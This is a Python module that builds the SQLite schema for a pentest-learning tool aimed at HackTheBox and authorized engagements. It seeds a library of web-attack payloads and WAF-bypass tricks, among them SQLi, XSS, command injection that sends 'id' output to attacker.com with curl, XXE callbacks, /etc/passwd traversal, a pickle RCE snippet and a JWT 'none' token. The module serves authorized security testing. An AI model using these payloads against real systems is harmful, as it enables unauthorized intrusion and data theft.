import aiosqlite
import asyncio
import os
from contextlib import asynccontextmanager
from pathlib import Path

DB_DIR = Path.home() / ".local" / "share" / "penlearn-local"
DB_PATH = DB_DIR / "penlearn.db"

SCHEMA_VERSION = 1

CREATE_STATEMENTS = [
    """
    CREATE TABLE IF NOT EXISTS schema_version (
        version INTEGER PRIMARY KEY,
        applied_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS projects (
        id INTEGER PRIMARY KEY,
        target TEXT NOT NULL,
        name TEXT NOT NULL,
        kind TEXT NOT NULL CHECK(kind IN ('htb_machine','htb_ctf','bug_bounty','authorized_pentest')),
        htb_machine_id INTEGER,
        htb_container_id TEXT,
        scope_json TEXT,
        status TEXT DEFAULT 'active',
        created_at INTEGER DEFAULT (strftime('%s','now')),
        updated_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS plans (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        objective TEXT NOT NULL,
        constraints_json TEXT,
        kpis_json TEXT,
        compliance_targets_json TEXT,
        version INTEGER DEFAULT 1,
        created_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS plan_steps (
        id INTEGER PRIMARY KEY,
        plan_id INTEGER NOT NULL REFERENCES plans(id),
        step_idx INTEGER NOT NULL,
        verb TEXT NOT NULL,
        target TEXT,
        args_json TEXT,
        budget_json TEXT,
        status TEXT DEFAULT 'pending',
        started_at INTEGER,
        ended_at INTEGER
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS execution_results (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        plan_step_id INTEGER REFERENCES plan_steps(id),
        tool_name TEXT NOT NULL,
        tool_version TEXT,
        args_json TEXT,
        stdout_path TEXT,
        stderr_path TEXT,
        exit_code INTEGER,
        status TEXT,
        started_at INTEGER,
        ended_at INTEGER,
        claude_tool_use_id TEXT,
        artifact_hash TEXT,
        wordlist_sha256 TEXT,
        mitre_attack_id TEXT,
        owasp_asvs_id TEXT
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS risk_items (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        execution_id INTEGER REFERENCES execution_results(id),
        severity TEXT NOT NULL CHECK(severity IN ('info','low','medium','high','critical')),
        title TEXT NOT NULL,
        description TEXT,
        evidence_json TEXT,
        cve_id TEXT,
        cvss REAL,
        attack_chain_position INTEGER,
        ttp_category TEXT,
        mitre_attack_id TEXT,
        owasp_asvs_id TEXT,
        impact TEXT,
        repro_steps_json TEXT,
        compliance_controls_json TEXT,
        remediation_json TEXT,
        verify_status TEXT DEFAULT 'open' CHECK(verify_status IN ('open','verified','false_positive')),
        verify_context TEXT,
        false_positive_score REAL,
        false_positive_rationale TEXT,
        blast_radius TEXT,
        confirmed_exploitable INTEGER DEFAULT 0,
        regression_required INTEGER DEFAULT 0,
        regression_verified_at INTEGER,
        regression_note TEXT,
        created_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS evidence_artifacts (
        id INTEGER PRIMARY KEY,
        risk_item_id INTEGER NOT NULL REFERENCES risk_items(id),
        kind TEXT NOT NULL,
        path TEXT NOT NULL,
        sha256 TEXT NOT NULL,
        har_path TEXT,
        pcap_path TEXT,
        dom_diff_path TEXT,
        console_log_path TEXT,
        reviewer TEXT,
        captured_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS fix_records (
        id INTEGER PRIMARY KEY,
        finding_id INTEGER NOT NULL REFERENCES risk_items(id),
        patch_summary TEXT,
        tests_added TEXT,
        deployment_notes TEXT,
        fix_owner TEXT,
        created_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS verification_records (
        id INTEGER PRIMARY KEY,
        finding_id INTEGER NOT NULL REFERENCES risk_items(id),
        fix_record_id INTEGER REFERENCES fix_records(id),
        retest_summary TEXT NOT NULL,
        evidence_of_closure TEXT,
        verified_by TEXT,
        verified_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS workspace_files (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        filename TEXT NOT NULL,
        kind TEXT CHECK(kind IN ('nda','scope','machine_info','writeup','reference','notes')),
        path TEXT NOT NULL,
        sha256 TEXT NOT NULL,
        added_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS approvals (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        intent TEXT NOT NULL,
        scope_json TEXT,
        rate_limit INTEGER,
        stop_conditions_json TEXT,
        time_window INTEGER,
        requested_at INTEGER DEFAULT (strftime('%s','now')),
        decided_at INTEGER,
        decision TEXT CHECK(decision IN ('approved','denied','pending')),
        decision_note TEXT
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS agent_sessions (
        id INTEGER PRIMARY KEY,
        project_id INTEGER NOT NULL REFERENCES projects(id),
        claude_session_id TEXT,
        started_at INTEGER DEFAULT (strftime('%s','now')),
        ended_at INTEGER,
        tokens_in INTEGER DEFAULT 0,
        tokens_out INTEGER DEFAULT 0,
        cost_estimate REAL DEFAULT 0,
        vpn_state TEXT
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS agent_messages (
        id INTEGER PRIMARY KEY,
        session_id INTEGER NOT NULL REFERENCES agent_sessions(id),
        turn_idx INTEGER NOT NULL,
        role TEXT NOT NULL CHECK(role IN ('user','assistant','tool')),
        content_json TEXT NOT NULL,
        tokens INTEGER,
        created_at INTEGER DEFAULT (strftime('%s','now')),
        hash_prev TEXT,
        hash_self TEXT NOT NULL
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS vpn_profiles (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        ovpn_path TEXT NOT NULL,
        kind TEXT CHECK(kind IN ('starting_point','machines','fortresses','pro_labs','seasonal','release_arena','custom_authorized')),
        region TEXT,
        last_connected_at INTEGER,
        is_default INTEGER DEFAULT 0
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS htb_credentials (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        mcp_token_hash TEXT,
        app_token_hash TEXT,
        added_at INTEGER DEFAULT (strftime('%s','now'))
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS ttp_library (
        category TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        detection_method TEXT,
        verification_payload TEXT,
        false_positive_patterns TEXT,
        waf_bypass TEXT,
        mitre_id TEXT,
        asvs_id TEXT
    )
    """,
    """
    CREATE TABLE IF NOT EXISTS wiki_gaps (
        topic TEXT PRIMARY KEY,
        why TEXT NOT NULL,
        attempted_query TEXT,
        request_count INTEGER DEFAULT 1,
        last_project_id INTEGER,
        first_requested_at INTEGER DEFAULT (strftime('%s','now')),
        last_requested_at INTEGER DEFAULT (strftime('%s','now')),
        status TEXT DEFAULT 'open' CHECK(status IN ('open','drafting','filled','dismissed'))
    )
    """,
]

INDEXES = [
    "CREATE INDEX IF NOT EXISTS idx_risk_items_project ON risk_items(project_id)",
    "CREATE INDEX IF NOT EXISTS idx_execution_results_project ON execution_results(project_id)",
    "CREATE INDEX IF NOT EXISTS idx_agent_messages_session ON agent_messages(session_id)",
    "CREATE INDEX IF NOT EXISTS idx_plan_steps_plan ON plan_steps(plan_id)",
    "CREATE INDEX IF NOT EXISTS idx_workspace_files_project ON workspace_files(project_id)",
]


async def init_db() -> None:
    DB_DIR.mkdir(parents=True, exist_ok=True)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA journal_mode=WAL")
        await db.execute("PRAGMA synchronous=FULL")
        await db.execute("PRAGMA foreign_keys=ON")

        for stmt in CREATE_STATEMENTS:
            await db.execute(stmt)
        for idx in INDEXES:
            await db.execute(idx)

        row = await (await db.execute("SELECT version FROM schema_version")).fetchone()
        if row is None:
            await db.execute(
                "INSERT INTO schema_version(version) VALUES (?)", (SCHEMA_VERSION,)
            )

        # Migrate existing risk_items tables that predate these columns
        for col, typedef in [
            ("impact",                   "TEXT"),
            ("repro_steps_json",         "TEXT"),
            ("compliance_controls_json", "TEXT"),
            ("remediation_json",         "TEXT"),
            ("false_positive_rationale", "TEXT"),
            ("blast_radius",             "TEXT"),
            ("confirmed_exploitable",    "INTEGER DEFAULT 0"),
            ("regression_required",      "INTEGER DEFAULT 0"),
            ("regression_verified_at",   "INTEGER"),
            ("regression_note",          "TEXT"),
        ]:
            try:
                await db.execute(f"ALTER TABLE risk_items ADD COLUMN {col} {typedef}")
            except Exception:
                pass  # column already exists

        # Migrate evidence_artifacts
        for col, typedef in [
            ("har_path",        "TEXT"),
            ("pcap_path",       "TEXT"),
            ("dom_diff_path",   "TEXT"),
            ("console_log_path","TEXT"),
            ("reviewer",        "TEXT"),
        ]:
            try:
                await db.execute(f"ALTER TABLE evidence_artifacts ADD COLUMN {col} {typedef}")
            except Exception:
                pass

        # Migrate execution_results
        for col, typedef in [
            ("tool_version",    "TEXT"),
            ("wordlist_sha256", "TEXT"),
            ("mitre_attack_id", "TEXT"),
            ("owasp_asvs_id",   "TEXT"),
        ]:
            try:
                await db.execute(f"ALTER TABLE execution_results ADD COLUMN {col} {typedef}")
            except Exception:
                pass

        await _seed_ttp_library(db)
        await db.commit()


_TTP_SEED = [
    ("sqli",                 "SQL Injection",                "T1190", "V5.3.4"),
    ("xss",                  "Cross-Site Scripting",         "T1059.007", "V5.3.3"),
    ("rce",                  "Remote Code Execution",        "T1190", "V5.3.8"),
    ("lfi",                  "Local File Inclusion",         "T1083", "V12.3.1"),
    ("ssrf",                 "Server-Side Request Forgery",  "T1090", "V10.3.2"),
    ("idor",                 "Insecure Direct Object Ref",   "T1078", "V4.1.1"),
    ("xxe",                  "XML External Entity",          "T1190", "V5.5.1"),
    ("ssti",                 "Server-Side Template Injection","T1059", "V5.3.9"),
    ("csrf",                 "Cross-Site Request Forgery",   "T1566", "V4.2.2"),
    ("auth_bypass",          "Authentication Bypass",        "T1110", "V2.1.1"),
    ("path_traversal",       "Path Traversal",               "T1083", "V12.3.1"),
    ("cmd_injection",        "Command Injection",            "T1059", "V5.3.8"),
    ("deserialization",      "Insecure Deserialization",     "T1190", "V1.14.6"),
    ("open_redirect",        "Open Redirect",                "T1598", "V5.1.5"),
    ("file_upload",          "Unrestricted File Upload",     "T1105", "V12.1.1"),
    ("information_disclosure","Information Disclosure",      "T1213", "V7.4.1"),
    ("misconfig",            "Security Misconfiguration",    "T1190", "V14.1.1"),
]

_TTP_DETAILS: dict[str, dict] = {
    "sqli": {
        "detection_method": "Inject ' OR '1'='1 into every string parameter. Time-based: ' AND SLEEP(5)-- -. Union-based: ' UNION SELECT NULL,NULL,NULL-- -. Error-based: ' AND 1=CONVERT(int,'a')--. Observe: error messages mentioning SQL syntax, unusual response times (>4s), extra data rows.",
        "verification_payload": "' OR '1'='1\n' UNION SELECT NULL,table_name FROM information_schema.tables--\n' AND SLEEP(5)--\n1; SELECT pg_sleep(5)--",
        "false_positive_patterns": "WAF blocks showing 403/406. Application validates input client-side (check server-side separately). Generic 500 errors unrelated to SQL engine.",
        "waf_bypass": "Use comments: SE/**/LECT. Double URL encode: %27. Case variation: SeLeCt. HTTP param pollution: id=1&id=2'-- -. Use INFORMATION_SCHEMA case variation. Try Null bytes: %00.",
    },
    "xss": {
        "detection_method": "Inject <script>alert(1)</script> into every reflected parameter. For DOM XSS, inspect URL fragments and postMessage handlers. Check for reflection in HTML body, attribute context, JavaScript string context, and JSON responses.",
        "verification_payload": "<script>alert(document.domain)</script>\n\"><img src=x onerror=alert(1)>\n'><svg onload=alert(1)>\njavascript:alert(1)\n<details open ontoggle=alert(1)>",
        "false_positive_patterns": "Payload reflected but HTML-escaped (&lt; &gt;). Reflected inside a comment. CSP blocks execution (check console for violations). Template engine double-encodes.",
        "waf_bypass": "Use event handlers: <img src=x onerror=alert(1)>. Use Unicode: \\u003cscript\\u003e. Use HTML5 tags: <details ontoggle>. Double URL encode. Split payload across multiple params.",
    },
    "rce": {
        "detection_method": "Inject OS commands via semicolon, pipe, backtick: ; id, | whoami, `id`. For Java deserialization: send ysoserial payload. For SSTI: inject {{7*7}} or ${7*7}. Observe: command output in response, OOB DNS/HTTP, error messages revealing command execution.",
        "verification_payload": "; id\n| id\n`id`\n$(id)\n; sleep 5\n& ping -c 1 attacker.com",
        "false_positive_patterns": "Generic timeout without confirming OOB. Error message mentions 'shell' but is a false trail. Response delay from network, not sleep command.",
        "waf_bypass": "Use IFS substitution: ${IFS}id. Use octal encoding: \\151\\144. Newline injection in headers. Split command: ;i\\d. Use env vars: $SHELL.",
    },
    "lfi": {
        "detection_method": "Inject ../../../etc/passwd into file path parameters. Test URL-encoded: %2e%2e%2f. Test null byte: ../../../etc/passwd%00.jpg. Test Windows: ..\\..\\..\\windows\\win.ini. Observe: /etc/passwd content, Windows ini sections, PHP source code disclosure.",
        "verification_payload": "../../../etc/passwd\n..%2f..%2f..%2fetc%2fpasswd\n....//....//....//etc/passwd\n/etc/passwd%00",
        "false_positive_patterns": "Error message 'file not found' without confirming traversal worked. Generic 500 error. File exists check returns true but no content disclosed.",
        "waf_bypass": "Double encode: %252e%252e%252f. Use /proc/self/environ instead of /etc/passwd. Use php://filter/convert.base64-encode/resource=index.php. Null byte bypass for older PHP.",
    },
    "ssrf": {
        "detection_method": "Supply http://169.254.169.254/latest/meta-data/ as a URL parameter. Use Burp Collaborator or interactsh for OOB confirmation. Test internal addresses: http://127.0.0.1:22, http://localhost:6379. Observe: metadata returned, unexpected DNS resolution, internal service responses.",
        "verification_payload": "http://169.254.169.254/latest/meta-data/\nhttp://[::1]:80\nhttp://127.0.0.1:22\ndict://127.0.0.1:11211/stats",
        "false_positive_patterns": "Timeout without OOB confirmation. Generic error for all external URLs (not specific to internal). URL validation bypassed in client but blocked server-side.",
        "waf_bypass": "Use decimal IP: http://2130706433/ (127.0.0.1). Use IPv6: http://[::ffff:127.0.0.1]. DNS rebinding. Use redirects. URL-encode the IP. Use cloud metadata variations: http://metadata.google.internal/.",
    },
    "idor": {
        "detection_method": "Substitute your own resource ID with another user's ID in GET/POST/PUT/DELETE requests. Test GUIDs by replacing known GUIDs. Test numeric IDs: id=100, id=101. Test in headers, cookies, and request body—not just URL parameters.",
        "verification_payload": "GET /api/user/2 (while authenticated as user 1)\nPOST /api/invoice {\"id\":999}\nGET /api/document?uuid=<other-user-uuid>",
        "false_positive_patterns": "Response returns same data for all IDs (no isolation). Resource is intentionally public. Authorization is checked but not logged.",
        "waf_bypass": "Use indirect references: replace ID with hash that resolves to another user's object. Try array notation: id[]=1&id[]=2. Try type juggling: id=1.0 vs id=1.",
    },
    "xxe": {
        "detection_method": "Inject DOCTYPE with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>. For blind XXE, use OOB: <!ENTITY xxe SYSTEM 'http://attacker.com/xxe'>. Observe: file content returned, DNS/HTTP callback, entity expansion errors.",
        "verification_payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\n<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.dtd'> %xxe;]>",
        "false_positive_patterns": "XML parser hardened (libxml2 NOENT flag). DOCTYPE stripped by application. DTD processing disabled.",
        "waf_bypass": "Use UTF-16 encoding. Use parameter entities with indirect expansion. Split DOCTYPE across multiple requests. Use FTP instead of HTTP for OOB.",
    },
    "ssti": {
        "detection_method": "Inject template expressions: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>. Observe: mathematical result (49) in response. For Jinja2: {{config.items()}}. For Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}.",
        "verification_payload": "{{7*7}}\n${7*7}\n#{7*7}\n<%= 7*7 %>\n{{config.items()}}\n{{''.__class__.__mro__[1].__subclasses__()}}",
        "false_positive_patterns": "Expression reflected literally (not evaluated). Math operation coincidentally returns 49 from database. Template sandboxing prevents RCE but allows evaluation.",
        "waf_bypass": "Use string concatenation: {{'7'*'7'}}. Use attr filter in Jinja2: ()|attr('__class__'). Use __getitem__ instead of attribute access.",
    },
    "csrf": {
        "detection_method": "Remove or modify the CSRF token in state-changing requests. Test if the server validates the token or accepts requests without it. Check SameSite cookie attribute. Test JSON CSRF: change Content-Type to text/plain.",
        "verification_payload": "Remove csrf_token parameter entirely\nChange csrf_token value to 'invalid'\nCross-origin form POST without token\nContent-Type: text/plain with JSON body",
        "false_positive_patterns": "Custom header (X-Requested-With) provides CSRF protection. SameSite=Strict prevents cross-origin. Token validated server-side as expected.",
        "waf_bypass": "Try Content-Type: text/plain for JSON APIs. Use form-urlencoded instead of JSON. Flash CSRF (obsolete but still present in legacy apps).",
    },
    "auth_bypass": {
        "detection_method": "Attempt login with SQL injection: admin'--. Try default credentials: admin/admin, admin/password. Test JWT with none algorithm. Try empty password. Attempt direct navigation to post-auth pages. Test password reset token reuse.",
        "verification_payload": "username=admin'--&password=x\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.\nGET /admin (without auth cookie)",
        "false_positive_patterns": "Redirect to login page without 401 (application-level redirect). Rate limiting triggers before bypass confirmed. JWT signature valid but user is not admin.",
        "waf_bypass": "Lowercase header names. Inject null bytes in username. Use Unicode variants of characters. Try HTTP verb tampering: HEAD /admin.",
    },
    "path_traversal": {
        "detection_method": "Inject ../ sequences in file path parameters. Test with URL encoding: %2e%2e%2f. Test double encoding: %252e%252e%252f. Test Windows separators on Windows targets. Observe: file content disclosure, error messages revealing paths.",
        "verification_payload": "../../../etc/passwd\n..%2f..%2f..%2fetc%2fpasswd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd\n....//....//etc/passwd",
        "false_positive_patterns": "Application restricts to specific extensions. Sandbox prevents reading outside webroot. Path is normalized before use.",
        "waf_bypass": "Use URL encoding variations. Use overlong UTF-8 sequences. Try absolute paths: /etc/passwd directly. Use null byte to truncate extension check.",
    },
    "cmd_injection": {
        "detection_method": "Inject OS command separators: ;id, |id, &id, &&id, `id`, $(id). Test in form fields, HTTP headers (User-Agent, X-Forwarded-For), and cookie values. Observe: command output in response, OOB DNS callbacks, response timing for sleep injection.",
        "verification_payload": ";id\n|id\n`id`\n$(id)\n;sleep 5\n| curl http://attacker.com/$(id)",
        "false_positive_patterns": "Response time delay from network not sleep. Application escapes shell metacharacters. Running in a restricted shell without id/sleep.",
        "waf_bypass": "Use IFS: ${IFS}id. Use hex: $'\\x69\\x64'. Split command across headers. Use env var expansion: $SHELL. Use newline injection.",
    },
    "deserialization": {
        "detection_method": "Identify serialization formats: Java (rO0AB), PHP (a:, O:), Python pickle, .NET ViewState. Use ysoserial for Java. Test PHP object injection by manipulating serialized objects. Observe: RCE, unexpected file writes, SSRF from deserialized objects.",
        "verification_payload": "Java: ysoserial payload with CommonsCollections\nPHP: O:8:\"stdClass\":1:{s:4:\"cmd\";s:6:\"id 2>&1\";}\nPython: cos\nsystem\n(S'id'\ntR.",
        "false_positive_patterns": "Serialized format detected but no exploitable gadget chain. Application deserializes but sandboxed. Old Java version without vulnerable gadget chain.",
        "waf_bypass": "Encode payload in base64 to avoid content inspection. Use chunked encoding. Send via alternative HTTP methods. Use GZIP compression.",
    },
    "open_redirect": {
        "detection_method": "Inject attacker-controlled URL in redirect parameters: ?next=https://evil.com, ?url=https://evil.com, ?return=. Observe: HTTP 301/302 Location header pointing to attacker URL. Test after login and logout flows.",
        "verification_payload": "?next=https://attacker.com\n?url=//attacker.com\n?redirect=javascript:alert(1)\n?return=https:attacker.com",
        "false_positive_patterns": "Redirect blocked by allowlist. Redirect to same domain only. Application adds own domain prefix.",
        "waf_bypass": "Use //attacker.com (protocol-relative). Use https:attacker.com (missing slashes). Use @ trick: https://target.com@attacker.com. Use backslash: https://target.com\\@attacker.com.",
    },
    "file_upload": {
        "detection_method": "Upload .php, .jsp, .aspx files with different Content-Types. Test double extensions: shell.php.jpg. Test null bytes: shell.php%00.jpg. Test MIME type bypass. Observe: file accessible at upload URL, RCE via uploaded shell.",
        "verification_payload": "filename=shell.php with Content-Type: image/jpeg\nfilename=shell.php.jpg\nfilename=shell.php%00.jpg\nContent-Type: image/jpeg with PHP content",
        "false_positive_patterns": "File uploaded but not accessible from webroot. Server-side validation strips executable content. File stored outside webroot.",
        "waf_bypass": "Change Content-Type to image/gif. Use double extension: .php.jpg. Add exif metadata with PHP code. Use .phtml, .php5, .shtml extensions.",
    },
    "information_disclosure": {
        "detection_method": "Check error pages for stack traces, paths, version numbers. Enumerate /robots.txt, /.well-known/, /api-docs, /swagger.json, /.env, /config.php, /backup.zip. Check HTTP response headers for server version, framework, and internal IPs.",
        "verification_payload": "GET /.env\nGET /config.php.bak\nGET /api-docs\nGET /swagger.json\nGET /phpinfo.php\nHTTP headers: Server, X-Powered-By, X-Generator",
        "false_positive_patterns": "Generic error page without sensitive info. Version info in public documentation. Headers are intentionally public.",
        "waf_bypass": "Try case variations: /.ENV, /Config.PHP. Use null byte: /.env%00. Try backup extensions: .bak, .old, .orig, .swp. Try hidden files: .htaccess, .DS_Store.",
    },
    "misconfig": {
        "detection_method": "Check for default credentials, unnecessary HTTP methods (TRACE, OPTIONS, DELETE), CORS misconfiguration (Origin: null, Origin: evil.com), missing security headers, exposed admin interfaces, open S3 buckets, exposed .git directories.",
        "verification_payload": "OPTIONS / HTTP/1.1\nOrigin: https://evil.com\nGET /.git/config\nGET /admin/ (default creds)\nAWS: s3 ls s3://bucket-name",
        "false_positive_patterns": "CORS allows trusted origins only. TRACE disabled at load balancer level. Admin interface requires VPN. .git returns 403 but directory exists.",
        "waf_bypass": "CORS: use null origin, vary origin, subdomain. HTTP methods: try lowercase verbs. Admin: try X-Forwarded-For: 127.0.0.1.",
    },
}

async def _seed_ttp_library(db) -> None:
    for category, name, mitre_id, asvs_id in _TTP_SEED:
        try:
            await db.execute(
                "INSERT OR IGNORE INTO ttp_library(category, name, mitre_id, asvs_id) VALUES(?,?,?,?)",
                (category, name, mitre_id, asvs_id),
            )
        except Exception:
            pass
    # Upsert full content for all categories
    for category, details in _TTP_DETAILS.items():
        try:
            await db.execute(
                """UPDATE ttp_library SET
                   detection_method=?, verification_payload=?,
                   false_positive_patterns=?, waf_bypass=?
                   WHERE category=?""",
                (
                    details.get("detection_method"),
                    details.get("verification_payload"),
                    details.get("false_positive_patterns"),
                    details.get("waf_bypass"),
                    category,
                ),
            )
        except Exception:
            pass


@asynccontextmanager
async def get_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA foreign_keys=ON")
        await db.execute("PRAGMA journal_mode=WAL")
        db.row_factory = aiosqlite.Row
        yield db


if __name__ == "__main__":
    asyncio.run(init_db())
    print(f"DB initialized at {DB_PATH}")
